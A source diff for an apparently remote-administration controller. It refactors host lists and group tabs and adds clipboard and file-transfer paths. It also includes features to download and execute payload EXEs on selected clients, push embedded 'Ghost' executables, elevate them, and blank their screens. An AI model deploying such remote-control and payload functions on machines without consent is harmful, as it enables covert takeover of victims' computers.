     dlg.Init(_TR("转移主机(到期自动复原)"), _TR("输入<IP:PORT>地址:"));
+    dlg.SetHistoryKey("ShareAddress");
     dlg.Init2(_TR("天数(支持浮点数):"), "30");
     if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty() || atof(dlg.m_sSecondInput.GetString())<=0)
         return;
@@ -4093,6 +7603,48 @@ void CMy2015RemoteDlg::OnNMCustomdrawMessage(NMHDR* pNMHDR, LRESULT* pResult)
     }
 }
 
+void CMy2015RemoteDlg::OnRClickMessage(NMHDR* pNMHDR, LRESULT* pResult)
+{
+    *pResult = 0;
+
+    CMenu menu;
+    menu.CreatePopupMenu();
+    menu.AppendMenu(MF_STRING, ID_MSGLOG_DELETE, _TR("删除选中"));
+    menu.AppendMenu(MF_STRING, ID_MSGLOG_CLEAR, _TR("清空日志"));
+
+    // 没有选中项时禁用"删除选中"
+    if (m_CList_Message.GetSelectedCount() == 0) {
+        menu.EnableMenuItem(ID_MSGLOG_DELETE, MF_GRAYED);
+    }
+    // 列表为空时禁用"清空日志"
+    if (m_CList_Message.GetItemCount() == 0) {
+        menu.EnableMenuItem(ID_MSGLOG_CLEAR, MF_GRAYED);
+    }
+
+    CPoint pt;
+    GetCursorPos(&pt);
+    menu.TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON, pt.x, pt.y, this);
+}
+
+void CMy2015RemoteDlg::OnMsglogDelete()
+{
+    // 从后往前删除，避免索引变化
+    POSITION pos = m_CList_Message.GetFirstSelectedItemPosition();
+    std::vector<int> selected;
+    while (pos) {
+        selected.push_back(m_CList_Message.GetNextSelectedItem(pos));
+    }
+    // 倒序删除
+    for (auto it = selected.rbegin(); it != selected.rend(); ++it) {
+        m_CList_Message.DeleteItem(*it);
+    }
+}
+
+void CMy2015RemoteDlg::OnMsglogClear()
+{
+    m_CList_Message.DeleteAllItems();
+}
+
 
 void CMy2015RemoteDlg::OnOnlineAddWatch()
 {
@@ -4100,7 +7652,8 @@ void CMy2015RemoteDlg::OnOnlineAddWatch()
     POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
     while (Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-        context* ctx = (context*)m_CList_Online.GetItemData(iItem);
+        context* ctx = GetContextByListIndex(iItem);
+        if (!ctx) continue;
         int r = m_ClientMap->GetClientMapInteger(ctx->GetClientID(), MAP_LEVEL);
         m_ClientMap->SetClientMapInteger(ctx->GetClientID(), MAP_LEVEL, ++r >= 4 ? 0 : r);
     }
@@ -4122,8 +7675,15 @@ void CMy2015RemoteDlg::OnNMCustomdrawOnline(NMHDR* pNMHDR, LRESULT* pResult)
     case CDDS_ITEMPREPAINT: {
         int nRow = static_cast<int>(pLVCD->nmcd.dwItemSpec);
         EnterCriticalSection(&m_cs);
-        context* ctx = (context*)m_CList_Online.GetItemData(nRow);
+        context* ctx = nullptr;
+        if (nRow >= 0 && nRow < (int)m_FilteredIndices.size()) {
+            size_t realIdx = m_FilteredIndices[nRow];
+            if (realIdx < m_HostList.size()) {
+                ctx = m_HostList[realIdx];
+            }
+        }
         LeaveCriticalSection(&m_cs);
+        if (!ctx) return;
         int r = m_ClientMap->GetClientMapInteger(ctx->GetClientID(), MAP_LEVEL);
         if (r >= 1) pLVCD->clrText = RGB(0, 0, 255); // 字体蓝
         if (r >= 2) pLVCD->clrText = RGB(255, 0, 0); // 字体红
@@ -4141,7 +7701,8 @@ void CMy2015RemoteDlg::OnOnlineRunAsAdmin()
         POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
         while (Pos) {
             int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-            context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+            context* ContextObject = GetContextByListIndex(iItem);
+            if (!ContextObject) continue;
             BYTE token = CMD_RUNASADMIN;
             ContextObject->Send2Client(&token, sizeof(token));
         }
@@ -4162,7 +7723,14 @@ void CMy2015RemoteDlg::OnMainWallet()
     }
     strcpy(m_settings.WalletAddress, dlg.m_str);
     THIS_CFG.SetStr("settings", "wallet", m_settings.WalletAddress);
-    SendMasterSettings(nullptr);
+    SendMasterSettings(nullptr, m_settings);
+}
+
+
+void CMy2015RemoteDlg::OnMainNetwork()
+{
+    CNetworkDlg dlg(this);
+    dlg.DoModal();
 }
 
 
@@ -4182,21 +7750,35 @@ void CMy2015RemoteDlg::OnOnlineUninstall()
     SendSelectedCommand(&bToken, sizeof(BYTE));
 
     EnterCriticalSection(&m_cs);
-    int iCount = m_CList_Online.GetSelectedCount();
-    for (int i = 0; i < iCount; ++i) {
-        POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
-        int iItem = m_CList_Online.GetNextSelectedItem(Pos);
-        CString strIP = m_CList_Online.GetItemText(iItem, ONLINELIST_IP);
-        context* ctx = (context*)m_CList_Online.GetItemData(iItem);
-        m_CList_Online.DeleteItem(iItem);
-        m_HostList.erase(ctx);
+    // 收集选中的索引（从大到小排序，避免删除时索引变化问题）
+    std::vector<int> selectedItems;
+    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+    while (Pos) {
+        selectedItems.push_back(m_CList_Online.GetNextSelectedItem(Pos));
+    }
+    std::sort(selectedItems.rbegin(), selectedItems.rend());
+
+    for (int iItem : selectedItems) {
+        context* ctx = GetContextByListIndex(iItem);
+        if (!ctx) continue;
+
+        CString strIP = ctx->GetClientData(ONLINELIST_IP);
         auto tm = ctx->GetAliveTime();
         std::string aliveInfo = tm >= 86400 ? floatToString(tm / 86400.f) + " d" :
                                 tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
                                 tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
+        RemoveFromHostList(ctx);
         ctx->Destroy();
         strIP += _TR("断开连接");
         ShowMessage(_TR("操作成功"), strIP + "[" + aliveInfo.c_str() + "]");
+    }
+
+    // 虚拟列表：重建过滤索引并更新项目计数
+    RebuildFilteredIndices();
+    m_CList_Online.SetItemCountExV((int)m_FilteredIndices.size(), LVSICF_NOINVALIDATEALL | LVSICF_NOSCROLL);
+    {
+        CListCtrlEx::ScopedEraseBkgnd scope(m_CList_Online);
+        m_CList_Online.RedrawWindow(NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_UPDATENOW);
     }
     LeaveCriticalSection(&m_cs);
 }
@@ -4209,36 +7791,74 @@ void CMy2015RemoteDlg::OnOnlinePrivateScreen()
 
     std::string masterId = GetPwdHash(), hmac = GetHMAC();
 
-    BYTE bToken[101] = { TOKEN_PRIVATESCREEN };
-    memcpy(bToken + 1, masterId.c_str(), masterId.length());
-    memcpy(bToken + 1 + masterId.length(), hmac.c_str(), hmac.length());
-    SendSelectedCommand(bToken, sizeof(bToken));
+    // 读取壁纸文件（如果有）
+    std::vector<BYTE> bmpData;
+    if (!m_PrivateScreenWallpaper.IsEmpty()) {
+        CFile file;
+        if (file.Open(m_PrivateScreenWallpaper, CFile::modeRead | CFile::typeBinary)) {
+            ULONGLONG fileSize = file.GetLength();
+            if (fileSize > 0 && fileSize < 10 * 1024 * 1024) {  // 限制10MB
+                bmpData.resize((size_t)fileSize);
+                file.Read(bmpData.data(), (UINT)fileSize);
+            }
+            file.Close();
+        }
+    }
+
+    // 构建命令: TOKEN(1) + masterId(64) + hmac(16) + [bmpSize(4) + bmpData(N)]
+    size_t totalSize = 1 + 64 + 16;
+    if (!bmpData.empty()) {
+        totalSize += 4 + bmpData.size();
+    }
+
+    std::vector<BYTE> buffer(totalSize);
+    buffer[0] = TOKEN_PRIVATESCREEN;
+    memcpy(buffer.data() + 1, masterId.c_str(), masterId.length());
+    memcpy(buffer.data() + 1 + masterId.length(), hmac.c_str(), hmac.length());
+
+    if (!bmpData.empty()) {
+        DWORD bmpSize = (DWORD)bmpData.size();
+        memcpy(buffer.data() + 81, &bmpSize, 4);
+        memcpy(buffer.data() + 85, bmpData.data(), bmpData.size());
+    }
+
+    SendSelectedCommand(buffer.data(), (ULONG)buffer.size());
+}
+
+void CMy2015RemoteDlg::RebuildFilteredIndices()
+{
+    m_FilteredIndices.clear();
+    for (size_t i = 0; i < m_HostList.size(); ++i) {
+        context* ctx = m_HostList[i];
+        if (!ctx) continue;
+        std::string groupName = ctx->GetGroupName();
+        // 匹配当前分组：空分组视为 "default"
+        if (groupName == m_selectedGroup ||
+            (groupName.empty() && m_selectedGroup == "default")) {
+            m_FilteredIndices.push_back(i);
+        }
+    }
 }
 
 void CMy2015RemoteDlg::LoadListData(const std::string& group)
 {
-    m_CList_Online.DeleteAllItems();
-    int iCount = 0;
-    for (auto& ctx : m_HostList) {
-        auto g = ctx->GetGroupName();
-        if ((group == _T("default") && g.empty()) || g == group) {
-            CString strIP=ctx->GetClientData(ONLINELIST_IP);
-            auto pubIP = ctx->GetAdditionalData(RES_CLIENT_PUBIP);
-            bool flag = strIP == "127.0.0.1" && !pubIP.IsEmpty();
-            int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), flag ? pubIP : strIP);
-            for (int n = ONLINELIST_ADDR; n <= ONLINELIST_CLIENTTYPE; n++) {
-                auto data = ctx->GetClientData(n);
-                auto note = m_ClientMap->GetClientMapData(ctx->GetClientID(), MAP_NOTE);
-                n == ONLINELIST_COMPUTER_NAME ?
-                m_CList_Online.SetItemText(i, n, !note.IsEmpty() ? note : data) :
-                              m_CList_Online.SetItemText(i, n, data.IsEmpty() ? "?" : data);
-            }
-            m_CList_Online.SetItemData(i, (DWORD_PTR)ctx);
-            iCount++;
-        }
+    m_CList_Online.SetRedraw(FALSE);
+
+    // 重建过滤索引
+    RebuildFilteredIndices();
+
+    // 虚拟列表：设置过滤后的项目计数
+    m_CList_Online.SetItemCountExV((int)m_FilteredIndices.size(), LVSICF_NOINVALIDATEALL | LVSICF_NOSCROLL);
+
+    m_CList_Online.SetRedraw(TRUE);
+    // 临时允许背景擦除，解决残留问题
+    {
+        CListCtrlEx::ScopedEraseBkgnd scope(m_CList_Online);
+        m_CList_Online.RedrawWindow(NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_UPDATENOW);
     }
     CString strStatusMsg;
-    strStatusMsg.FormatL("有%d个主机在线", iCount);
+    strStatusMsg.FormatL("有%d个主机在线", (int)m_FilteredIndices.size());
+    strStatusMsg += CString("[Total: ") + std::to_string(m_HostList.size()).c_str() + "]";
     m_StatusBar.SetPaneText(0, strStatusMsg);
 }
 
@@ -4246,7 +7866,7 @@ void CMy2015RemoteDlg::OnSelchangeGroupTab(NMHDR* pNMHDR, LRESULT* pResult)
 {
     int nSel = m_GroupTab.GetCurSel();
     TCHAR szText[256] = {};
-    TCITEM item;
+    TCITEM item = {0};
     item.mask = TCIF_TEXT;
     item.pszText = szText;
     item.cchTextMax = sizeof(szText) / sizeof(TCHAR);
@@ -4260,14 +7880,25 @@ void CMy2015RemoteDlg::OnSelchangeGroupTab(NMHDR* pNMHDR, LRESULT* pResult)
     LoadListData(szText);
     LeaveCriticalSection(&m_cs);
 
+    // 清空搜索缓存，避免切换 Tab 后搜索结果错乱
+    if (m_pSearchBar) {
+        m_pSearchBar->InvalidateCache();
+    }
+
     *pResult = 0;
 }
 
+void RefreshGroupList(context* ctx, void* user)
+{
+    CString* groupName = (CString*)user;
+    ctx->SetGroupName(groupName->GetString());
+}
 
 void CMy2015RemoteDlg::OnOnlineRegroup()
 {
     CInputDialog dlg(this);
     dlg.Init(_TR("修改分组"), _TR("请输入分组名称:"));
+    dlg.SetHistoryKey("GroupName");
     if (IDOK != dlg.DoModal()||dlg.m_str.IsEmpty()) {
         return;
     }
@@ -4277,7 +7908,35 @@ void CMy2015RemoteDlg::OnOnlineRegroup()
     }
     BYTE cmd[50] = { CMD_SET_GROUP };
     memcpy(cmd + 1, dlg.m_str, dlg.m_str.GetLength());
-    SendSelectedCommand(cmd, sizeof(cmd));
+    SendSelectedCommand(cmd, sizeof(cmd), RefreshGroupList, &(dlg.m_str));
+    CAutoLock lock(m_cs);
+    m_selectedGroup = dlg.m_str;
+    if (m_GroupList.end() == m_GroupList.find(m_selectedGroup)) {
+        m_GroupTab.InsertItem(m_GroupTab.GetItemCount(), m_selectedGroup.c_str());
+        m_GroupList.insert(m_selectedGroup);
+    }
+    // 在 Tab 中直接搜索分组名（Tab 顺序和 set 顺序不一致）
+    int tabCount = m_GroupTab.GetItemCount();
+    for (int idx = 0; idx < tabCount; ++idx) {
+        TCITEM item = {0};
+        char szText[256] = {0};
+        item.mask = TCIF_TEXT;
+        item.pszText = szText;
+        item.cchTextMax = sizeof(szText);
+        if (!m_GroupTab.GetItem(idx, &item)) continue;
+        if (m_selectedGroup == szText) {
+            m_GroupTab.SetCurSel(idx);
+            NMHDR nmhdr;
+            nmhdr.hwndFrom = m_GroupTab.GetSafeHwnd();
+            nmhdr.idFrom = m_GroupTab.GetDlgCtrlID();
+            nmhdr.code = TCN_SELCHANGE;
+            SendMessage(WM_NOTIFY, nmhdr.idFrom, (LPARAM)&nmhdr);
+            // SendMessage 会触发 OnSelchangeGroupTab，其中已调用 LoadListData
+            return;
+        }
+    }
+    // 未找到匹配的 Tab（不应发生），直接加载数据
+    LoadListData(m_selectedGroup);
 }
 
 
@@ -4288,7 +7947,8 @@ void CMy2015RemoteDlg::MachineManage(MachineCommand type)
         POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
         while (Pos) {
             int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-            context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+            context* ContextObject = GetContextByListIndex(iItem);
+            if (!ContextObject) continue;
             BYTE token[32] = { TOKEN_MACHINE_MANAGE, type };
             ContextObject->Send2Client(token, sizeof(token));
         }
@@ -4318,7 +7978,7 @@ void CMy2015RemoteDlg::OnExecuteDownload()
 {
     CInputDialog dlg(this);
     dlg.Init(_TR("下载执行"), _TR("远程下载地址:"));
-    auto ip = THIS_CFG.GetStr("settings", "master", "127.0.0.1");
+    auto ip = GetFirstMasterIP(THIS_CFG.GetStr("settings", "master", "127.0.0.1"));
     dlg.m_str = BuildPayloadUrl(ip.c_str(), "example.exe");
     dlg.m_sTipInfo = _TR("请将EXE放在\"Payloads\"目录或输入下载地址。");
 
@@ -4343,7 +8003,7 @@ void CMy2015RemoteDlg::OnExecuteDownload()
 void CMy2015RemoteDlg::OnExecuteUpload()
 {
     CFileDialog dlg(TRUE, NULL, NULL, OFN_HIDEREADONLY | OFN_FILEMUSTEXIST,
-        _TR("可执行文件 (*.exe)|*.exe||"), this);
+                    _T("EXE Files (*.exe)|*.exe||"), this);
 
     if (dlg.DoModal() != IDOK)
         return;
@@ -4352,7 +8012,7 @@ void CMy2015RemoteDlg::OnExecuteUpload()
     CFile file;
 
     if (!file.Open(strFilePath, CFile::modeRead | CFile::typeBinary)) {
-        MessageBoxL("无法读取文件!\r\n" + strFilePath, "错误", MB_ICONERROR);
+        MessageBoxL(_TR("无法读取文件!") + "\r\n" + strFilePath, "错误", MB_ICONERROR);
         return;
     }
 
@@ -4381,6 +8041,32 @@ void CMy2015RemoteDlg::OnExecuteUpload()
     delete[] pPacket;
 }
 
+
+void CMy2015RemoteDlg::OnExecuteTestrun()
+{
+	DWORD dwSize = 0;
+    BYTE* buffer = ReadExeFromResource(dwSize, IDR_TESTRUN_X64, CLIENT_TYPE_ONE, Startup_TestRunMsc,
+        "YAMA", "ServerD11", COMMAND_UPLOAD_EXEC, 4);
+    if (buffer && dwSize > 0) {
+        SendSelectedCommand(buffer, 5 + dwSize);
+        delete[] buffer;
+    } else {
+        MessageBoxL("资源文件读取失败!", "错误", MB_ICONERROR);
+	}
+}
+
+void CMy2015RemoteDlg::OnExecuteGhost()
+{
+	DWORD dwSize = 0;
+    BYTE *buffer = ReadExeFromResource(dwSize, IDR_GHOST_X64, CLIENT_TYPE_ONE, Startup_GhostMsc,
+		"YAMA", "ServerDll", COMMAND_UPLOAD_EXEC, 4);
+    if (buffer && dwSize > 0) {
+        SendSelectedCommand(buffer, 5 + dwSize);
+        delete[] buffer;
+    } else {
+        MessageBoxL("资源文件读取失败!", "错误", MB_ICONERROR);
+	}
+}
 
 void CMy2015RemoteDlg::OnDestroy()
 {
@@ -4474,16 +8160,41 @@ void CMy2015RemoteDlg::RemoveRemoteWindow(HWND wnd)
     LeaveCriticalSection(&m_cs);
 }
 
-void CMy2015RemoteDlg::UpdateActiveRemoteSession(CDialogBase *sess){
-	EnterCriticalSection(&m_cs);
-    m_pActiveSession = sess;
-	LeaveCriticalSection(&m_cs);
+void CMy2015RemoteDlg::CloseRemoteDesktopByClientID(uint64_t clientID)
+{
+    CScreenSpyDlg* targetDlg = nullptr;
+    HWND hWnd = NULL;
+
+    EnterCriticalSection(&m_cs);
+    for (auto& pair : m_RemoteWnds) {
+        CScreenSpyDlg* dlg = dynamic_cast<CScreenSpyDlg*>(pair.second);
+        if (dlg && dlg->GetClientID() == clientID) {
+            targetDlg = dlg;
+            hWnd = dlg->GetSafeHwnd();
+            break;
+        }
+    }
+    LeaveCriticalSection(&m_cs);
+
+    if (targetDlg && hWnd && ::IsWindow(hWnd)) {
+        // Use SendMessage for synchronous close to prevent race condition
+        // when user reconnects quickly after disconnect
+        ::SendMessage(hWnd, WM_CLOSE, 0, 0);
+    }
 }
 
-CDialogBase* CMy2015RemoteDlg::GetActiveRemoteSession() {
-	EnterCriticalSection(&m_cs);
-	auto sess = m_pActiveSession;
-	LeaveCriticalSection(&m_cs);
+void CMy2015RemoteDlg::UpdateActiveRemoteSession(CDialogBase *sess)
+{
+    EnterCriticalSection(&m_cs);
+    m_pActiveSession = sess;
+    LeaveCriticalSection(&m_cs);
+}
+
+CDialogBase* CMy2015RemoteDlg::GetActiveRemoteSession()
+{
+    EnterCriticalSection(&m_cs);
+    auto sess = m_pActiveSession;
+    LeaveCriticalSection(&m_cs);
     return sess;
 }
 
@@ -4495,89 +8206,95 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
     if (nCode == HC_ACTION) {
         do {
             static CDialogBase* operateWnd = nullptr;
+            static time_t localCtrlCTime = 0;  // 本地 Ctrl+C 时间，用于区分本地/远程复制
+			static std::vector<std::string> fileList;
             KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
-            // 先判断是否需要处理的热键
-            bool bNeedCheck = false;
-            if (wParam == WM_SYSKEYDOWN || wParam == WM_SYSKEYUP) {
-                // 所有系统键都需要检查
-                bNeedCheck = true;
-            }
-            // Win 键 (开始菜单、Win+D/E/R/L 等)
-            else if (pKey->vkCode == VK_LWIN || pKey->vkCode == VK_RWIN) {
-                bNeedCheck = true;
-            }
-            // Alt+Tab (切换窗口)
-            else if (pKey->vkCode == VK_TAB && (pKey->flags & LLKHF_ALTDOWN)) {
-                bNeedCheck = true;
-            }
-            // Alt+Esc (循环切换窗口)
-            else if (pKey->vkCode == VK_ESCAPE && (pKey->flags & LLKHF_ALTDOWN)) {
-                bNeedCheck = true;
-            }
-            // Ctrl+Shift+Esc (任务管理器)
-            else if (pKey->vkCode == VK_ESCAPE &&
-                     (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
-                     (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
-                bNeedCheck = true;
-            }
-            // Ctrl+Esc (开始菜单)
-            else if (pKey->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
-                bNeedCheck = true;
-            }
-            // F12 (调试器热键)
-            else if (pKey->vkCode == VK_F12 || pKey->vkCode == VK_F10) {
-                bNeedCheck = true;
-            }
-            // Print Screen (截图)
-            else if (pKey->vkCode == VK_SNAPSHOT) {
-                bNeedCheck = true;
-            }
-            // Win+Tab (任务视图)
-            else if (pKey->vkCode == VK_TAB &&
-                     (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000)) {
-                bNeedCheck = true;
-            }
-            if (bNeedCheck && g_2015RemoteDlg->m_bHookWIN) {
+
+            // 系统热键转发：只在远程桌面窗口处于控制模式时才处理
+            if (g_2015RemoteDlg->m_bHookWIN) {
                 HWND hFore = ::GetForegroundWindow();
                 auto screen = (CScreenSpyDlg*)g_2015RemoteDlg->GetRemoteWindow(hFore);
                 if (screen && screen->m_bIsCtrl) {
-                    MSG msg = { 0 };
-                    msg.hwnd = hFore;
-                    msg.message = (UINT)wParam;
-                    msg.wParam = pKey->vkCode;
-                    msg.lParam = (pKey->scanCode << 16) | 1;
-
-                    if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
-                        msg.lParam |= (1 << 31) | (1 << 30);
+                    // 判断是否是需要转发的系统热键
+                    bool bNeedForward = false;
+                    if (wParam == WM_SYSKEYDOWN || wParam == WM_SYSKEYUP) {
+                        bNeedForward = true;
                     }
-
-                    // 扩展键标志 (bit 24)
-                    if (pKey->flags & LLKHF_EXTENDED) {
-                        msg.lParam |= (1 << 24);
+                    else if (pKey->vkCode == VK_LWIN || pKey->vkCode == VK_RWIN) {
+                        bNeedForward = true;
                     }
+                    else if (pKey->vkCode == VK_TAB && (pKey->flags & LLKHF_ALTDOWN)) {
+                        bNeedForward = true;
+                    }
+                    else if (pKey->vkCode == VK_ESCAPE && (pKey->flags & LLKHF_ALTDOWN)) {
+                        bNeedForward = true;
+                    }
+                    else if (pKey->vkCode == VK_ESCAPE &&
+                             (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
+                             (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
+                        bNeedForward = true;
+                    }
+                    else if (pKey->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
+                        bNeedForward = true;
+                    }
+                    else if (pKey->vkCode == VK_F12 || pKey->vkCode == VK_F10) {
+                        bNeedForward = true;
+                    }
+                    else if (pKey->vkCode == VK_SNAPSHOT) {
+                        bNeedForward = true;
+                    }
+                    else if (pKey->vkCode == VK_TAB &&
+                             (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000)) {
+                        bNeedForward = true;
+                    }
+                    if (bNeedForward) {
+                        MSG msg = { 0 };
+                        msg.hwnd = hFore;
+                        msg.message = (UINT)wParam;
+                        msg.wParam = pKey->vkCode;
+                        msg.lParam = (pKey->scanCode << 16) | 1;
 
-                    msg.time = pKey->time;
-                    msg.pt.x = 0;
-                    msg.pt.y = 0;
-                    screen->SendScaledMouseMessage(&msg, false);
-                    // 返回 1 阻止本地系统处理
-                    return 1;
+                        if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
+                            msg.lParam |= (1 << 31) | (1 << 30);
+                        }
+
+                        // 扩展键标志 (bit 24)
+                        if (pKey->flags & LLKHF_EXTENDED) {
+                            msg.lParam |= (1 << 24);
+                        }
+
+                        msg.time = pKey->time;
+                        msg.pt.x = 0;
+                        msg.pt.y = 0;
+                        screen->SendScaledMouseMessage(&msg, false);
+                        // 返回 1 阻止本地系统处理
+                        return 1;
+                    }
                 }
             }
             // 只在按下时处理
             if (wParam == WM_KEYDOWN) {
                 // 检测 Ctrl+C / Ctrl+X
+                static time_t remoteCtrlCTime = 0;  // C2C: 远程 Ctrl+C 时间
                 if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (pKey->vkCode == 'C' || pKey->vkCode == 'X')) {
                     HWND hFore = ::GetForegroundWindow();
                     operateWnd = g_2015RemoteDlg->GetRemoteWindow(hFore);
-                    if (!operateWnd)
-                        g_2015RemoteDlg->UpdateActiveRemoteSession(nullptr);
+                    if (!operateWnd) {
+                        localCtrlCTime = time(nullptr);
+                        remoteCtrlCTime = 0;  // 清除远程 Ctrl+C 时间
+                        int r=0;
+						fileList = GetForegroundSelectedFiles(r);
+                        // 不再清除活动会话，用 localCtrlCTime 判断即可
+                    } else {
+                        remoteCtrlCTime = time(nullptr);  // 记录远程 Ctrl+C 时间
+                        localCtrlCTime = 0;  // 清除本地 Ctrl+C 时间
+                    }
                 }
                 // 检测 Ctrl+V
                 else if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && pKey->vkCode == 'V') {
                     HWND hFore = ::GetForegroundWindow();
                     CDialogBase* dlg = g_2015RemoteDlg->GetRemoteWindow(hFore);
-                    if (dlg) {
+                    if (dlg && (time(nullptr) - localCtrlCTime < 60)) {
                         if (dlg == operateWnd)break;
                         auto screen = (CScreenSpyDlg*)dlg;
                         if (!screen->m_bIsCtrl) {
@@ -4587,21 +8304,31 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
                         // [1] 本地 -> 远程
                         int result;
                         auto files = GetClipboardFiles(result);
-                        if (files.empty()) files = GetForegroundSelectedFiles(result);
+                        if (files.empty()) files = fileList;
                         if (!files.empty()) {
-                            // 获取远程目录
-                            auto str = BuildMultiStringPath(files);
-                            BYTE* szBuffer = new BYTE[81 + str.size()];
-                            szBuffer[0] = { COMMAND_GET_FOLDER };
-                            std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
-                            memcpy((char*)szBuffer + 1, masterId.c_str(), masterId.length());
-                            memcpy((char*)szBuffer + 1 + masterId.length(), hmac.c_str(), hmac.length());
-                            memcpy(szBuffer + 1 + 80, str.data(), str.size());
-                            auto md5 = CalcMD5FromBytes((BYTE*)str.data(), str.size());
-                            g_2015RemoteDlg->m_CmdList.PutCmd(md5);
-                            dlg->m_ContextObject->Send2Client(szBuffer, 81 + str.size());
-                            SAFE_DELETE_ARRAY(szBuffer);
-                            Mprintf("【Ctrl+V】 从本地拷贝文件到远程: %s \n", md5.c_str());
+                            // 检查客户端是否支持 V2
+                            uint64_t clientID = screen->GetClientID();
+                            context* mainCtx = g_2015RemoteDlg->FindHost(clientID);
+
+                            if (mainCtx && SupportsFileTransferV2(mainCtx)) {
+                                // V2 传输
+                                g_2015RemoteDlg->SendFilesToClientV2(mainCtx, files);
+                                Mprintf("【Ctrl+V】 [本地 -> 远程] V2 传输: %zu 个文件\n", files.size());
+                            } else {
+                                // V1 传输（兼容旧客户端）
+                                auto str = BuildMultiStringPath(files);
+                                BYTE* szBuffer = new BYTE[81 + str.size()];
+                                szBuffer[0] = { COMMAND_GET_FOLDER };
+                                std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
+                                memcpy((char*)szBuffer + 1, masterId.c_str(), masterId.length());
+                                memcpy((char*)szBuffer + 1 + masterId.length(), hmac.c_str(), hmac.length());
+                                memcpy(szBuffer + 1 + 80, str.data(), str.size());
+                                auto md5 = CalcMD5FromBytes((BYTE*)str.data(), str.size());
+                                g_2015RemoteDlg->m_CmdList.PutCmd(md5);
+                                dlg->m_ContextObject->Send2Client(szBuffer, 81 + str.size());
+                                SAFE_DELETE_ARRAY(szBuffer);
+                                Mprintf("【Ctrl+V】 [本地 -> 远程] V1 传输: %s\n", md5.c_str());
+                            }
                         } else {
                             CString strText = GetClipboardText();
                             if (!strText.IsEmpty()) {
@@ -4620,11 +8347,80 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
                                 Mprintf("【Ctrl+V】 本地剪贴板没有文本或文件: %d \n", result);
                             }
                         }
-                    } else if (g_2015RemoteDlg->GetActiveRemoteSession() && operateWnd) {
+                    } else if (dlg && operateWnd && dlg != operateWnd && (time(nullptr) - remoteCtrlCTime < 60)) {
+                        // [3] 远程A -> 远程B (C2C)
+                        auto srcScreen = (CScreenSpyDlg*)operateWnd;
+                        auto dstScreen = (CScreenSpyDlg*)dlg;
+
+                        if (!srcScreen->m_bIsCtrl || !dstScreen->m_bIsCtrl) {
+                            Mprintf("【Ctrl+V】 [C2C] 窗口不是控制状态\n");
+                            break;
+                        }
+
+                        // 检查连接对象是否有效
+                        if (!srcScreen->m_ContextObject || !dstScreen->m_ContextObject) {
+                            Mprintf("【Ctrl+V】 [C2C] 连接对象无效\n");
+                            break;
+                        }
+
+                        // 获取源和目标的客户端ID
+                        uint64_t srcClientID = srcScreen->GetClientID();
+                        uint64_t dstClientID = dstScreen->GetClientID();
+
+                        if (srcClientID == 0 || dstClientID == 0) {
+                            Mprintf("【Ctrl+V】 [C2C] 客户端ID无效: src=%llu, dst=%llu\n", srcClientID, dstClientID);
+                            break;
+                        }
+
+                        // 检查双方是否支持 V2 文件传输协议
+                        context* srcMainCtx = g_2015RemoteDlg->FindHost(srcClientID);
+                        context* dstMainCtx = g_2015RemoteDlg->FindHost(dstClientID);
+                        if (!srcMainCtx || !dstMainCtx) {
+                            Mprintf("【Ctrl+V】 [C2C] 主连接无效\n");
+                            break;
+                        }
+                        if (!SupportsFileTransferV2(srcMainCtx) || !SupportsFileTransferV2(dstMainCtx)) {
+                            Mprintf("【Ctrl+V】 [C2C] 客户端版本不支持 V2 传输 (需要 >= %s)\n", FILE_TRANSFER_V2_DATE);
+                            break;
+                        }
+
+                        // 构建 C2C 剪贴板请求
+                        ClipboardRequestV2 req = {};
+                        req.cmd = COMMAND_CLIPBOARD_V2;
+                        req.srcClientID = srcClientID;
+                        req.dstClientID = dstClientID;
+                        req.transferID = GenerateTransferID();
+
+                        std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
+                        memcpy(req.hash, masterId.c_str(), min(masterId.length(), sizeof(req.hash)));
+                        memcpy(req.hmac, hmac.c_str(), min(hmac.length(), sizeof(req.hmac)));
+
+                        // 先通知目标客户端准备接收（捕获当前目录）
+                        // 注意：必须发送到主连接（KernelManager），不是远程桌面会话
+                        C2CPreparePacket prepare = {};
+                        prepare.cmd = COMMAND_C2C_PREPARE;
+                        prepare.transferID = req.transferID;
+                        prepare.srcClientID = srcClientID;  // 源客户端，用于返回目录响应
+                        dstMainCtx->Send2Client((BYTE*)&prepare, sizeof(prepare));
